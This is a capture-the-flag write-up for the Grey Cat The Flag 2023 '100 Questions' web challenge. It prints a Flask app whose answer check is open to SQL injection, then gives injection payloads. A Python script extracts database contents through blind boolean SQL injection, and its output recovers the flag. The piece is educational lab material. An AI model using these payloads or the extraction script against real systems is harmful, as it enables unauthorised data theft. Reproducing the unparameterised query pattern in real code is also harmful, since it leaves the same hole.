# 100 Questions

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- 137 solves / 50 points
- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

I love doing practice papers! There are 100 questions, but the answers to some are more important than others...

Alternative URLs: [http://34.126.139.50:10513](http://34.126.139.50:10513) [http://34.126.139.50:10514](http://34.126.139.50:10514) [http://34.126.139.50:10515](http://34.126.139.50:10515)

[http://34.126.139.50:10512](http://34.126.139.50:10512)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Grey-Cat-The-Flag-2023-Qualifiers/images/Pasted%20image%2020230520115724.png)

In here, we can type an answer based on the question's equation.

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/Grey-Cat-The-Flag-2023-Qualifiers/Web/100-Questions/dist.zip):**
```shell
┌[siunam♥earth]-(~/ctf/Grey-Cat-The-Flag-2023-Qualifiers/Web/100-Questions)-[2023.05.20|11:58:13(HKT)]
└> file dist.zip 
dist.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
┌[siunam♥earth]-(~/ctf/Grey-Cat-The-Flag-2023-Qualifiers/Web/100-Questions)-[2023.05.20|11:58:15(HKT)]
└> unzip dist.zip 
Archive:  dist.zip
  inflating: app.py                  
  inflating: database.db             
 extracting: requirements.txt        
  inflating: templates/index.html    
```

**In `app.py`, we can see the web application's main logic:**
```python
from flask import Flask, render_template, request
import sqlite3

app = Flask(__name__)

@app.route("/", methods=["GET"])
def index():
    qn_id, ans= request.args.get("qn_id", default="1"), request.args.get("ans", default="")

    # id check, i don't want anyone to pollute the inputs >:(
    if not (qn_id and qn_id.isdigit() and int(qn_id) >= 1 and int(qn_id) <= 100):
        # invalid!!!!!
        qn_id = 1
    
    # get question
    db = sqlite3.connect("database.db")
    cursor = db.execute(f"SELECT Question FROM QNA WHERE ID = {qn_id}")
    qn = cursor.fetchone()[0]

    # check answer
    cursor = db.execute(f"SELECT * FROM QNA WHERE ID = {qn_id} AND Answer = '{ans}'")
    result = cursor.fetchall()
    correct = True if result != [] else False

    return render_template("index.html", qn_id=qn_id, qn=qn, ans=ans, correct=correct)

if __name__ == "__main__":
    app.run()
```

In route `/`, it'll check the `qn_id` GET parameter's value is digit or not, and is between 1 to 100.

So... **No Server-Side Template Injection (SSTI) :(**

**Next, it'll fetch the question based on the `qn_id` GET parameter's value:**
```python
    # get question
    db = sqlite3.connect("database.db")
    cursor = db.execute(f"SELECT Question FROM QNA WHERE ID = {qn_id}")
    qn = cursor.fetchone()[0]
```

As you can see, it doesn't have any prepared statement. But, **since `qn_id` is validated**, we can't do SQL injection in here.

However, that's not the case in `ans` GET parameter :D

```python
    # check answer
    cursor = db.execute(f"SELECT * FROM QNA WHERE ID = {qn_id} AND Answer = '{ans}'")
    result = cursor.fetchall()
    correct = True if result != [] else False
```

Again, **no prepared statement, AND the `ans` parameter's value IS NOT validated.**

Which means we can do SQL injection in here!

**To get the answer correct, we just need to provide `' OR 1=1-- -` in the `ans` GET parameter:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Grey-Cat-The-Flag-2023-Qualifiers/images/Pasted%20image%2020230520120710.png)

Uhh... But where's the flag??? There's no flag in the web application...

## Exploitation

That being said, we need to **exfiltrate data from the database via SQL injection**.

Since there's no data is returned after the SQL query, Union-based SQL injection doesn't work in here. We try that:

**Found 3 columns in table `QNA`:**
```sql
' ORDER BY 3-- -
```

> Note: `ORDER BY 4` will trigger "500 INTERNAL SERVER ERROR", which means there are 3 columns.

**No data is returned:**
```sql
' UNION SELECT 'string1','string2','string3'-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Grey-Cat-The-Flag-2023-Qualifiers/images/Pasted%20image%2020230520121708.png)

Hence, this is a **Blind-based SQL injection**.

**More specifically, it's blind SQL injection with conditional responses:**
```sql
' OR 1=1-- -
' OR 1=2-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Grey-Cat-The-Flag-2023-Qualifiers/images/Pasted%20image%2020230520125301.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Grey-Cat-The-Flag-2023-Qualifiers/images/Pasted%20image%2020230520125315.png)

**That being said, we should be able to exfiltrate data via `substr()` function in SQLite.**

> Note: The `Answer` column is interesting to us, so we first exfiltrate data from table `QNA` in column `Answer`.

**To do so, I'll write a Python script:**
```python
#!/usr/bin/env python3
import requests
import string

if __name__ == '__main__':
    URL = 'http://34.126.139.50:10512/'
    position = 1
    exfiltratedData = ''
    characters = string.ascii_letters + string.digits + '''!"$%'()*+,-./:;<=>?@[\\]^_`{|}~'''
    id = 1

    while True:
        for character in characters:
            payload = f'''2' AND (SELECT SUBSTR(Answer, {position}, 1) FROM QNA WHERE ID={id} LIMIT 1 OFFSET 0) = '{character}'-- -'''
            print(f'[*] Trying payload: {payload}', end='\r')
            requestResult = requests.get(f'{URL}?qn_id=1&ans={payload}')

            if 'Correct!' in requestResult.text:
                exfiltratedData += ''.join(character)
                print(f'[+] Found answer: {exfiltratedData} in question ID {id}, payload: {payload}')
                position += 1
                break
        else:
            print('[-] Looped through all potential characters, no matched character.\n')
            id += 1
```

This will loop through all questions and characters.

**Run the script, and you should find the flag in question ID 42:**
```shell
┌[siunam♥earth]-(~/ctf/Grey-Cat-The-Flag-2023-Qualifiers/Web/100-Questions)-[2023.05.20|13:32:57(HKT)]
└> python3 solve.py
[...]
[+] Found answer: g in question ID 42, payload: 2' AND (SELECT SUBSTR(Answer, 1, 1) FROM QNA WHERE ID=42 LIMIT 1 OFFSET 0) = 'g'-- -
[+] Found answer: gr in question ID 42, payload: 2' AND (SELECT SUBSTR(Answer, 2, 1) FROM QNA WHERE ID=42 LIMIT 1 OFFSET 0) = 'r'-- -
[+] Found answer: gre in question ID 42, payload: 2' AND (SELECT SUBSTR(Answer, 3, 1) FROM QNA WHERE ID=42 LIMIT 1 OFFSET 0) = 'e'-- -
[+] Found answer: grey in question ID 42, payload: 2' AND (SELECT SUBSTR(Answer, 4, 1) FROM QNA WHERE ID=42 LIMIT 1 OFFSET 0) = 'y'-- -
[+] Found answer: grey{ in question ID 42, payload: 2' AND (SELECT SUBSTR(Answer, 5, 1) FROM QNA WHERE ID=42 LIMIT 1 OFFSET 0) = '{'-- -
[+] Found answer: grey{1 in question ID 42, payload: 2' AND (SELECT SUBSTR(Answer, 6, 1) FROM QNA WHERE ID=42 LIMIT 1 OFFSET 0) = '1'-- -
[+] Found answer: grey{1_ in question ID 42, payload: 2' AND (SELECT SUBSTR(Answer, 7, 1) FROM QNA WHERE ID=42 LIMIT 1 OFFSET 0) = '_'-- -
[+] Found answer: grey{1_c in question ID 42, payload: 2' AND (SELECT SUBSTR(Answer, 8, 1) FROM QNA WHERE ID=42 LIMIT 1 OFFSET 0) = 'c'-- -
[+] Found answer: grey{1_c4 in question ID 42, payload: 2' AND (SELECT SUBSTR(Answer, 9, 1) FROM QNA WHERE ID=42 LIMIT 1 OFFSET 0) = '4'-- -
[+] Found answer: grey{1_c4N in question ID 42, payload: 2' AND (SELECT SUBSTR(Answer, 10, 1) FROM QNA WHERE ID=42 LIMIT 1 OFFSET 0) = 'N'-- -
[+] Found answer: grey{1_c4N7 in question ID 42, payload: 2' AND (SELECT SUBSTR(Answer, 11, 1) FROM QNA WHERE ID=42 LIMIT 1 OFFSET 0) = '7'-- -
[+] Found answer: grey{1_c4N7_ in question ID 42, payload: 2' AND (SELECT SUBSTR(Answer, 12, 1) FROM QNA WHERE ID=42 LIMIT 1 OFFSET 0) = '_'-- -
[+] Found answer: grey{1_c4N7_5 in question ID 42, payload: 2' AND (SELECT SUBSTR(Answer, 13, 1) FROM QNA WHERE ID=42 LIMIT 1 OFFSET 0) = '5'-- -
[+] Found answer: grey{1_c4N7_53 in question ID 42, payload: 2' AND (SELECT SUBSTR(Answer, 14, 1) FROM QNA WHERE ID=42 LIMIT 1 OFFSET 0) = '3'-- -
[+] Found answer: grey{1_c4N7_533 in question ID 42, payload: 2' AND (SELECT SUBSTR(Answer, 15, 1) FROM QNA WHERE ID=42 LIMIT 1 OFFSET 0) = '3'-- -
[+] Found answer: grey{1_c4N7_533} in question ID 42, payload: 2' AND (SELECT SUBSTR(Answer, 16, 1) FROM QNA WHERE ID=42 LIMIT 1 OFFSET 0) = '}'-- -
[-] Looped through all potential characters, no matched character.
[...]
```

- **Flag: `grey{1_c4N7_533}`**

## Conclusion

What we've learned:

1. Exploiting Blind SQL Injection With Conditional Responses